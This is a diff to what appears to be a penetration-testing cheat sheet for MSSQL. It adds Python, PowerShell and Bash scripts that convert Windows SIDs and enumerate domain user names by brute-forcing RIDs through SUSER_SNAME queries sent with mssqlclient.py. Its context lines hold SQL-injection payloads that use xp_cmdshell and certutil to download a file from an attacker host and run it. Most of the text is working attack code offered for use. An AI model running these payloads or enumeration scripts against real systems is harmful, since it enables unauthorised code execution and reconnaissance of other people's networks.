@@ -299,6 +299,82 @@ http://<RHOST>/index.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://<
 http://<RHOST>/index.php?age='; EXEC xp_cmdshell 'C:\Windows\Temp\<FILE>.exe'; --
 ```
 
+### Relative Identifier (RID) Transformation and User Enumeration
+
+#### Transformation
+
+##### Python Solution
+
+```python
+def hex_sid_to_string_sid(hex_sid):
+    sid_bytes = bytes.fromhex(hex_sid[2:])
+    revision = sid_bytes[0]
+    sub_auth_count = sid_bytes[1]
+    identifier_authority = int.from_bytes(sid_bytes[2:8], byteorder='big')
+    sub_authorities = [
+        int.from_bytes(sid_bytes[8 + (i * 4):12 + (i * 4)], byteorder='little')
+        for i in range(sub_auth_count)
+    ]
+    string_sid = f"S-{revision}-{identifier_authority}"
+    for sub_auth in sub_authorities:
+        string_sid += f"-{sub_auth}"
+    return string_sid
+
+hex_sid = "0x010500000000000515000000a185deefb22433798d8e847a00020000"
+sid = hex_sid_to_string_sid(hex_sid)
+print(sid)
+```
+
+##### PowerShell Solution
+
+```powershell
+$BinarySID = "010500000000000515000000a185deefb22433798d8e847a00020000"
+$SIDBytes = [byte[]]::new($BinarySID.Length / 2)
+for ($i = 0; $i -lt $BinarySID.Length; $i += 2) {
+    $SIDBytes[$i / 2] = [convert]::ToByte($BinarySID.Substring($i, 2), 16)
+}
+$SID = New-Object System.Security.Principal.SecurityIdentifier($SIDBytes, 0)
+$SID.Value
+```
+
+#### User Enumeration
+
+##### Python Solution
+
+```python
+def generate_rid_queries(base_sid, start_rid, count, output_file):
+    with open(output_file, "w") as file:
+        for rid in range(start_rid, start_rid + count):
+            hex_rid = f"{rid:08X}" 
+            reversed_rid = ''.join(
+                [hex_rid[i:i+2] for i in range(0, len(hex_rid), 2)][::-1]
+            )
+            full_sid = f"{base_sid}{reversed_rid}"
+            query = f"SELECT SUSER_SNAME({full_sid})"
+            file.write(query + "\n")
+
+if __name__ == "__main__":
+    generate_rid_queries("0x010500000000000515000000A185DEEFB22433798D8E847A", 500, 1000, "queries.txt")
+```
+
+##### Bash Solution
+
+```bash
+#!/bin/bash
+
+USERNAME="<USERNAME>"
+PASSWORD="<PASSWORD>"
+SERVER="<RHOST>"
+SID_BASE="S-1-5-21-4024337825-2033394866-2055507597"
+
+for SID in {1100..1200}; do
+    QUERY="SELECT SUSER_SNAME(SID_BINARY(N'$SID_BASE-$SID'))"
+    echo "$QUERY" > query.sql
+    mssqlclient.py "$USERNAME:$PASSWORD@$SERVER" -file query.sql  | grep -a <DOMAIN>
+    rm query.sql
+done
+```
+
 ## MySQL
 
 > https://www.mysqltutorial.org/mysql-cheat-sheet.aspx
